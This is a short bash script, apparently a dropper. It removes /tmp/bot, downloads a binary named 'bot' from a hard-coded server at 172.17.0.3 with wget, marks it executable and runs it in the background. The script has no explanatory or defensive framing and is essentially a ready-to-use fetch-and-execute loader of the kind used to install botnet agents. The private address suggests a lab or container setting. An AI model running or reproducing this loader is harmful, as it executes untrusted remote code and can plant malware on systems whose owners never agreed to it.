#!/bin/bash

SERVER_IP="http://172.17.0.3"


rm -rf /tmp/bot

wget -c ${SERVER_IP}/bot -P /tmp && chmod +x /tmp/bot && /tmp/bot&


